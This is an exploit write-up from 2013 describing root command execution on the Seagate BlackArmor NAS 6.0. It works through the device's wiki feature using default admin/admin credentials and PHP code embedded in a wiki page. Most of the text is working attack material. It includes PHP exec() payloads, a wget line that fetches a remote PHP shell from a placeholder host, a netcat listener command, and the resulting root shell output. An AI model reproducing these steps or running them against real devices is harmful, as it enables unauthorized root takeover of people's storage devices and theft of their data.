# Exploit Title: Command Execution and remote shell in Seagate BlackArmor NAS
# Google Dork: n/a
# Date: 2013-07-31
# Exploit Author: madmantm
# Vendor Homepage: www.seagate.com
# Software Link: n/a
# Version: 6.0
# Tested on: MontaVista Linux
# CVE : n/a
# Disclosed : 2013-08-01 (Seagate) Currently not fixed.

The WIKI function of the Seagate BlackArmor NAS is able to execute php code in a new wiki page.

Here are the following steps to gain root on the embedded device.

You will create a new wiki page by going in the blackarmor NAS
Sharing/Wikiserver, you will enter the Wiki Share Name and put the wiki on a volume, preferably public.
You will check the enable wikiserver options and when it's created click on go to wiki server.

You will then authenticate on the wiki as admin/admin, and then activate the php function in the options.

Then create a new wiki page and insert the following PHP code.


<php>
echo exec("id", $output);
echo print_r($output);
</php>

this will then result in the following information being displayed on the page

uid=0(root) gid=0(root)


then to get more information about the running kernel

<php>
echo exec("uname -a", $output);
echo print_r($output);
</php>

Linux BA-380658 2.6.35.13-cavm1.whitney-econa.whitney-econa #2 Tue Apr 16 17:21:02 PDT 2013 armv6l GNU/Linux

to get more information about the current distro being used.

<php>
echo exec("cat /etc/issue", $output);
echo print_r($output);
</php>

MontaVista(R) Linux(R) 6.0

MontaVista Linux 6 .dev-snapshot-20130417 \n \l


to recover a remote php shell

<php>
echo exec("wget http://0.0.0.0/cli2.php", $output);
echo print_r($output);
</php>

open a netcat listener

nc -vlp 31337

then access the file with your favorite browser.

you should now have root access with a shell.


Connection from [192.168.200.14] port 31337 [tcp/*] accepted (family 2, sport 53315)
Linux BA-380658 2.6.35.13-cavm1.whitney-econa.whitney-econa #2 Tue Apr 16 17:21:02 PDT 2013 armv6l GNU/Linux
sh: w: not found
uid=0(root) gid=0(root)
/bin/sh: can't access tty; job control turned off
/ # / # / # 
/ # 
/ # ls
VolumeData
apps
atsahs
bin
blackarmor
boot
dev
dokuwiki
downloads
etc
home
itunes
lib
linuxrc
lost+found
media
mindsource
mnt
nfs
opt
proc
sbin
shares
staticpage
sys
temp
tmp
usr
var
www
www_services
/ # 

